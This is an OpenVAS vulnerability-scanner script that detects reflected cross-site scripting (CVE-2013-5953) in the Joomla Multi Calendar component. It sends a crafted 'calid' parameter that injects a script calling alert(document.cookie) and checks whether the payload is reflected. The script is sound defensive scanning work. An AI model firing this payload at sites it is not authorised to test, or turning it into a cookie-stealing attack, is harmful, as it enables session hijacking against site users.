###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_multi_calendar_mult_xss_vuln.nasl 3522 2016-06-15 12:39:54Z benallard $
#
# Joomla Component Multi Calendar Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.804337";
CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 3522 $");
  script_cve_id("CVE-2013-5953");
  script_bugtraq_id(66260);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2016-06-15 14:39:54 +0200 (Wed, 15 Jun 2016) $");
  script_tag(name:"creation_date", value:"2014-03-17 19:46:07 +0530 (Mon, 17 Mar 2014)");
  script_name("Joomla Component Multi Calendar Multiple Cross Site Scripting Vulnerabilities");

  tag_summary =
"This host is installed with Joomla component Multi Calendar and is prone to
multiple cross site scripting vulnerabilities.";

  tag_vuldetect =
"Send a crafted data via HTTP GET request and check whether it is able to read
cookie or not.";

  tag_insight =
"Multiple flaws are due to insufficient validation of 'calid' and 'paletteDefault'
HTTP GET parameters passed to 'index.php' script.";

    tag_impact =
"Successful exploitation will allow remote attackers to execute arbitrary HTML
and script code in a users browser session in the context of an affected site
and launch other attacks.

Impact Level: Application";

  tag_affected =
"Joomla Component Multi Calendar version 4.0.2 and probably other versions";

  tag_solution =
"No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";


  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/joomla-multi-calendar-402-cross-site-scripting");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/125738/Joomla-Multi-Calendar-4.0.2-Cross-Site-Scripting.html");
  script_summary("Check if Joomla Multi Calendar is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_mandatory_keys("joomla/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
http_port = 0;
dir = "";
url = "";

## Get HTTP Port
if(!http_port = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  exit(0);
}

## Get Joomla Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:http_port)){
  exit(0);
}

## Construct the attack request
url = dir + '/index.php?option=com_multicalendar&task=editevent&calid=1";' +
            '</script><script>alert(document.cookie);</script>';

## Check the response to confirm vulnerability
if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
               pattern:"<script>alert\(document.cookie\);</script>",
               extra_check:">Calendar"))
{
  security_message(http_port);
  exit(0);
}
